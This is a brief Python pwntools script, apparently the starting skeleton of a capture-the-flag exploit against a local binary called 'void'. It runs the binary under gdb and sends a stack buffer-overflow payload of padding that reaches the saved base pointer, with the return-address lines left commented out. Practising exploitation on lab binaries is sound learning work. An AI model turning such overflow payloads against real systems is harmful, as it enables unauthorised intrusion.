#!/usr/bin/python
import sys
import struct
from pwn import *

context.log_level = 'error'

e = ELF("./void")
libc = ELF("./glibc/libc.so.6")
# p = process(e.path)
p = gdb.debug(e.path, gdbscript=open('script.gdb', 'r').read())

deadcode = p64(0xdeadc0dedeadc0de)

payload = b'A'*72
payload += b'B'*8                # rbp

# payload += TARGET_FUNCTION       # function to exec
# payload += deadcode              # return for TARGET_FUNCTION

p.sendline(payload)
